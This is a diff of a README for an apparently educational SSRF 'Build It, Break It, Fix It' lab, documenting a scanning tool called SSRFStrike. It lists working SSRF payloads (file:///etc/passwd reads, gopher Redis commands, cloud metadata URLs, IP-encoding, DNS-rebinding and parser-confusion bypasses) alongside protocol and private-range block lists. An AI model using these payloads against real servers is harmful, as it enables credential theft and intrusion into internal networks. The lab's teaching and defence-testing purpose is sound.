@@ -1,17 +1,28 @@
-# Flask SSRF Vulnerability & Protection Laboratory
+# 🕵️‍♂️ SSRFStrike - Advanced SSRF Exploitation & Security Validation Suite
 
-## 🔍 Overview
+## 📋 Overview
 
-This comprehensive educational project demonstrates **Server-Side Request Forgery (SSRF)** vulnerabilities through a "Build It, Break It, Fix It" methodology. Learn how SSRF attacks work, exploit them in realistic scenarios, and implement robust defenses.
+**SSRFStrike** is the advanced exploitation tool integrated into the comprehensive SSRF Laboratory. It provides both automated testing capabilities and an interactive web interface for comprehensive SSRF vulnerability assessment as part of the "Build It, Break It, Fix It" methodology.
+
+## 🎯 Integrated Project Architecture
+
+```
+ssrf-lab/
+├── 🚨 vulnerable_app.py          # Intentionally vulnerable application
+├── 🛡️ ssrfprotector.py           # SSRFProtector
+├── 🛡️ secure_app.py              # Protected application  
+├── 🏠 localhashboard.py          # Internal admin dashboard
+├── ⚔️ ssrfstrike.py              # Advanced SSRF exploitation tool
+├── ⚔️ test_file.txt              # Secret file
+├── ⚔️ myfolder/myfile.txt        # Personal file
+├── ⚔️ downloads                  # Downloads
+├── 📦 requirements.txt           # Dependencies
+└── 📚 README.md                  # Complete documentation
+```
 
 ## ⚡ Quick Start
 
-### Prerequisites
-- Python 3.7+
-- Flask
-- Requests
-
-### Installation
+### Installation & Setup
 ```bash
 # Clone and setup
 git clone <repository>
@@ -25,117 +36,141 @@ source venv/bin/activate  # Linux/Mac
 
 # Install dependencies
 pip install flask requests
+
+# Start the vulnerable application for testing
+python vulnerable_app.py &
 ```
 
-## 🎯 Project Architecture
+## 🕵️‍♂️ SSRFStrike Usage
 
-```
-ssrf-lab/
-├── vulnerable_app.py          # 🚨 Intentionally vulnerable application
-├── secure_app.py              # 🛡️ Protected application
-├── localhashboard.py          # 🏠 Internal admin dashboard
-├── exploit_ssrf.py            # ⚔️ SSRF exploitation tool
-├── requirements.txt           # 📦 Dependencies
-└── README.md                 # 📚 This file
-```
-
-## 🚨 Vulnerable Application (`vulnerable_app.py`)
-
-### Features
-- **Unrestricted URL fetching** - No protocol validation
-- **Dangerous protocol support** - `file://`, `gopher://`, `phar://`, `data://`, `dict://`
-- **No IP filtering** - Access to internal networks and metadata services
-
-### Run Vulnerable App
+### Basic Usage
 ```bash
+# Start web interface (default) - Access at http://localhost:8080
+python ssrfstrike.py
+
+# CLI mode against vulnerable application
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get
+
+# CLI mode against secure application  
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy
+
+# Save results to file
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get -o scan_results.json
+```
+
+### Test Suites
+```bash
+# Comprehensive testing (all attack vectors)
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite all
+
+# IP Encoding Attacks
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite encoding
+
+# Internal Service Enumeration
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite internal
+
+# Cloud Metadata Access
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite cloud
+
+# Protocol-Based Attacks
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite protocols
+
+# Bypass Techniques
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite bypass
+```
+
+## 🔬 Complete Testing Workflow
+
+### Step 1: Start All Services
+```bash
+# Terminal 1 - Vulnerable Application
 python vulnerable_app.py
-```
-Access: http://localhost:5000
 
-### Example Exploits
-```bash
-# Local file reading
-curl "http://localhost:5000/vulnerable-proxy?url=file:///etc/passwd"
-
-# Internal service access
-curl "http://localhost:5000/vulnerable-proxy?url=http://localhost:80/admin"
-
-# Cloud metadata
-curl "http://localhost:5000/vulnerable-proxy?url=http://169.254.169.254/latest/meta-data/"
-
-# Gopher protocol attack
-curl "http://localhost:5000/vulnerable-proxy?url=gopher://127.0.0.1:6379/_INFO"
-```
-
-## 🛡️ Secure Application (`secure_app.py`)
-
-### Security Features
-- **Protocol Whitelisting** - Only HTTP/HTTPS allowed
-- **Private IP Blocking** - RFC 1918, loopback, link-local ranges
-- **Domain Allow Lists** - Configurable trusted domains
-- **Port Restrictions** - Only common web ports permitted
-- **DNS Rebinding Protection** - Blocks bypass attempts
-- **Input Validation** - Comprehensive URL parsing
-- **Request Limits** - Timeouts, size limits, redirect controls
-
-### Run Secure App
-```bash
+# Terminal 2 - Secure Application  
 python secure_app.py
-```
-Access: http://localhost:5000
 
-### Security Endpoints
+# Terminal 3 - Internal Dashboard (requires admin/sudo)
+sudo python localhashboard.py
+
+# Terminal 4 - SSRFStrike Tool
+python ssrfstrike.py
+```
+
+### Step 2: Test Vulnerable Application
 ```bash
-# Test URL validation
-curl "http://localhost:5000/validate-url?url=https://httpbin.org/json"
+# Comprehensive attack against vulnerable app
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite all
+
+# Expected: Multiple vulnerabilities found
+# - File protocol access
+# - Internal service enumeration  
+# - Protocol attacks successful
 ```
 
-## 🏠 Internal Dashboard (`localhashboard.py`)
-
-### Purpose
-Simulates an internal admin dashboard that should not be publicly accessible.
-
-### Run Dashboard
+### Step 3: Test Secure Application
 ```bash
-# Requires admin privileges for port 80
-sudo python localhashboard.py  # Linux/Mac
-python localhashboard.py       # Windows (as Admin)
+# Validate security controls
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy --suite all
+
+# Expected: All attacks blocked
+# - Protocol validation working
+# - IP filtering effective
+# - Bypass attempts prevented
 ```
-Access: http://localhost:80
 
-## ⚔️ Exploitation Tools
-
-### Automated Exploitation (`exploit_ssrf.py`)
+### Step 4: Analyze Results
 ```bash
-python exploit_ssrf.py
-```
-Tests multiple attack vectors:
-- Internal service enumeration
-- Cloud metadata access
-- Protocol-based attacks
-- Bypass techniques
-Validates security controls:
-- Allowed URL testing
-- Blocked protocol verification
-- Private IP blocking
-- Bypass attempt detection
+# Generate comprehensive report
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get -o vulnerable_scan.json
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy -o secure_scan.json
 
-## 🔬 Attack Scenarios
-
-### 1. Internal Network Reconnaissance
-```http
-http://localhost:5000/vulnerable-proxy?url=http://192.168.1.1/
-http://localhost:5000/vulnerable-proxy?url=http://10.0.0.1:8080/
+# Compare results
+diff vulnerable_scan.json secure_scan.json
 ```
 
-### 2. Cloud Metadata Exploitation
-```http
-http://localhost:5000/vulnerable-proxy?url=http://169.254.169.254/latest/meta-data/
-http://localhost:5000/vulnerable-proxy?url=http://metadata.google.internal/
+## 🎯 SSRFStrike Test Coverage
+
+### 1. IP Encoding Attacks
+Tests various IP representation bypasses:
+```bash
+# Decimal: 127.0.0.1 → 2130706433
+# Hexadecimal: 127.0.0.1 → 0x7f.0.0.1, 0x7f000001  
+# Octal: 127.0.0.1 → 0177.0.0.1
+# Mixed: 127.0.0.1 → 0x7f.1, 0177.0.0x1
 ```
 
-### 3. Dangerous Protocol Attacks
-```http
+### 2. Internal Service Enumeration
+Discovers internal network services:
+```bash
+# Localhost variations
+localhost, 127.0.0.1, 0.0.0.0, [::1]
+
+# Common internal IPs  
+192.168.1.1, 10.0.0.1, 172.16.0.1
+
+# Application ports
+80, 443, 8080, 3000, 5000, 6379, 11211
+```
+
+### 3. Cloud Metadata Access
+Tests cloud provider metadata services:
+```bash
+# AWS EC2
+169.254.169.254/latest/meta-data/
+
+# Google Cloud
+metadata.google.internal/computeMetadata/v1/
+
+# Azure
+169.254.169.254/metadata/instance
+
+# DigitalOcean
+169.254.169.254/metadata/v1/
+```
+
+### 4. Protocol-Based Attacks
+Exploits dangerous URL schemes:
+```bash
 file:///etc/passwd                    # Local file read
 gopher://127.0.0.1:6379/_INFO         # Redis exploitation
 phar:///malicious.phar                # PHP deserialization
@@ -143,127 +178,174 @@ data:text/html,<script>alert(1)</script> # XSS injection
 dict://127.0.0.1:11211/stats          # Service enumeration
 ```
 
-### 4. Bypass Techniques
-```http
-http://0177.0.0.1:80/                 # Octal encoding
-http://0x7f.0.0.1:80/                 # Hexadecimal encoding  
-http://2130706433:80/                 # Decimal encoding
-http://127.0.0.1.nip.io:80/           # DNS rebinding
-http://[::]:80/                       # IPv6 bypass
+### 5. Bypass Techniques
+Tests evasion methods:
+```bash
+# DNS rebinding
+127.0.0.1.nip.io, sslip.io, localtest.me
+
+# URL parser confusion
+http://127.0.0.1@google.com/
+http://google.com@127.0.0.1/
+
+# IPv6 variations
+[::], [::1], [::ffff:127.0.0.1]
 ```
 
-## 🛡️ Defense Mechanisms
+## 📊 Expected Results Matrix
 
-### 1. Input Validation
+| Test Category | Vulnerable App | Secure App | Learning Objective |
+|---------------|----------------|------------|-------------------|
+| **IP Encoding** | ✅ Exploitable | ✅ Blocked | Encoding detection |
+| **Internal Services** | ✅ Accessible | ✅ Blocked | Network segmentation |
+| **Cloud Metadata** | ✅ Accessible | ✅ Blocked | Metadata protection |
+| **File Protocol** | ✅ Read files | ✅ Blocked | Protocol validation |
+| **Gopher Protocol** | ✅ Exploitable | ✅ Blocked | Dangerous protocols |
+| **DNS Rebinding** | ✅ Bypass works | ✅ Blocked | DNS validation |
+| **Data URI** | ✅ Injection works | ✅ Blocked | Input sanitization |
+
+## 🛡️ Security Control Validation
+
+SSRFStrike validates these security mechanisms:
+
+### 1. Protocol Validation
 ```python
-# Protocol whitelisting
-ALLOWED_SCHEMES = {'http', 'https'}
-BLOCKED_SCHEMES = {'file', 'gopher', 'phar', 'data', 'dict'}
-
-# Domain allow list
-ALLOWED_DOMAINS = {'httpbin.org', 'api.trusted.com'}
+# Tests if these are properly blocked
+BLOCKED_PROTOCOLS = ['file://', 'gopher://', 'phar://', 'data://', 'dict://']
 ```
 
-### 2. Network Security
+### 2. IP Address Filtering
 ```python
-# Private IP blocking
-def is_private_ip(host):
-    ip_obj = ipaddress.ip_address(host)
-    return (ip_obj.is_private or 
-            ip_obj.is_loopback or 
-            ip_obj.is_link_local)
+# Validates private IP blocking
+PRIVATE_RANGES = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8']
 ```
 
-### 3. Request Hardening
+### 3. Input Sanitization
 ```python
-# Security constraints
-response = requests.get(
-    url,
-    timeout=10,           # Request timeout
-    allow_redirects=True, # Controlled redirects
-    max_redirects=2,      # Redirect limit
-    verify=True           # SSL verification
-)
+# Tests encoding bypass detection
+ENCODING_TYPES = ['decimal', 'hexadecimal', 'octal', 'mixed']
 ```
 
-## 📊 Impact Assessment
+### 4. DNS Security
+```python
+# Validates DNS rebinding protection
+BYPASS_SERVICES = ['nip.io', 'sslip.io', 'localtest.me', 'lvh.me']
+```
 
-| Attack Vector | Impact Level | Protected |
-|---------------|--------------|-----------|
-| `file://` protocol | Critical | ✅ |
-| `gopher://` protocol | Critical | ✅ |
-| Internal service access | High | ✅ |
-| Cloud metadata | High | ✅ |
-| `data://` XSS injection | Medium | ✅ |
-| `dict://` enumeration | Medium | ✅ |
-| Network scanning | Medium | ✅ |
+## 🔧 Advanced Testing Scenarios
 
-## 🔧 Security Recommendations
+### Custom Target Testing
+```bash
+# Test specific application endpoints
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/webhook
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/image-proxy
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/api/export
 
-### Application Layer
-1. **Input Validation**
-   - Use allow lists over deny lists
-   - Validate URL schemes and destinations
-   - Implement strict URL parsing
+# Test with different applications
+python ssrfstrike.py --mode cli http://app.company.com/ssrf-endpoint
+```
 
-2. **Network Controls**
-   - Implement outbound firewall rules
-   - Use network segmentation
-   - Restrict internal service access
+### Integration with Development
+```bash
+# Test in CI/CD pipeline
+python ssrfstrike.py --mode cli $STAGING_URL --suite all
 
-3. **Monitoring & Logging**
-   - Log all external requests
-   - Monitor for suspicious patterns
-   - Implement rate limiting
+# Security gate check
+python ssrfstrike.py --mode cli $APP_URL && echo "SSRF checks passed"
 
-### Infrastructure Layer
-1. **Cloud Protections**
-   - Use IMDSv2 (Instance Metadata Service v2)
-   - Implement service mesh with egress controls
-   - Use cloud security groups and NACLs
+# Generate compliance reports
+python ssrfstrike.py --mode cli $PROD_URL -o security_audit.json
+```
 
-2. **Container Security**
-   - Use non-root users
-   - Implement network policies
-   - Regular vulnerability scanning
+## 📈 Learning Progression
 
-## 🧪 Learning Objectives
+### Phase 1: Vulnerability Discovery
+```bash
+# Discover what attacks work
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite all
+```
 
-After completing this lab, you will understand:
+### Phase 2: Defense Implementation
+```bash
+# Implement protections in secure_app.py
+# Test if vulnerabilities are fixed
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy --suite all
+```
 
-### Vulnerability Understanding
-- How SSRF vulnerabilities occur in web applications
-- Common attack vectors and their impact
-- Real-world exploitation scenarios
+### Phase 3: Control Validation
+```bash
+# Verify security controls are effective
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy --suite bypass
+```
 
-### Defense Implementation
-- Multi-layered SSRF protection strategies
-- Input validation best practices
-- Network security controls
+### Phase 4: Advanced Testing
+```bash
+# Test custom applications
+python ssrfstrike.py --mode cli http://your-app.com/endpoint --suite all
+```
 
-### Security Testing
-- Automated vulnerability detection
+## 🎓 Educational Outcomes
+
+Using SSRFStrike in the lab helps understand:
+
+### Technical Skills
+- SSRF vulnerability patterns and exploitation
+- Defense mechanism implementation
 - Security control validation
-- Penetration testing methodologies
+- Risk assessment methodologies
 
-## 🚀 Advanced Usage
+### Professional Skills
+- Automated security testing
+- Penetration testing methodologies  
+- Security reporting and documentation
+- Compliance validation
 
-### Custom Security Configurations
-Modify `SECURITY_CONFIG` in `secure_app.py`:
-```python
-SECURITY_CONFIG = {
-    'allowed_schemes': {'http', 'https'},
-    'allowed_domains': {'your-trusted-domain.com'},
-    'allowed_ports': {80, 443, 8080},
-    'timeout': 15,
-    'max_content_length': 5 * 1024 * 1024,
-}
+### Real-World Application
+- Cloud security configurations
+- Network segmentation principles
+- Input validation best practices
+- Incident response preparation
+
+## 🔒 Responsible Usage
+
+### Authorization Requirements
+```bash
+# Only test systems you own or have explicit permission to test
+python ssrfstrike.py --mode cli http://your-own-server.com
+
+# Use in isolated environments for learning
+python ssrfstrike.py --mode cli http://127.0.0.2:5000
+
+# Respect scanning policies and rate limits
 ```
 
-### Integration Testing
-```python
-# Test your applications against SSRF
-from security_test import SecurityTester
-tester = SecurityTester('http://your-app:5000')
-tester.test_blocked_protocols()
+### Legal Compliance
+- Obtain proper authorization before testing
+- Follow responsible disclosure practices  
+- Adhere to local laws and regulations
+- Use only in educational or authorized contexts
+
+## 🚀 Getting Help
+
+### Common Issues
+```bash
+# Port conflicts
+python ssrfstrike.py --port 8081
+
+# Missing dependencies  
+pip install --upgrade flask requests
+
+# Application not running
+# Ensure vulnerable_app.py is running on port 5000
 ```
+
+### Debug Mode
+```bash
+# Enable verbose output
+export SSRFSTRIKE_DEBUG=1
+python ssrfstrike.py --mode cli http://127.0.0.2:5000/get
+```
+
+---
+
+**SSRFStrike** completes the SSRF Laboratory by providing professional-grade testing capabilities that bridge the gap between theoretical understanding and practical security assessment. 🛡️
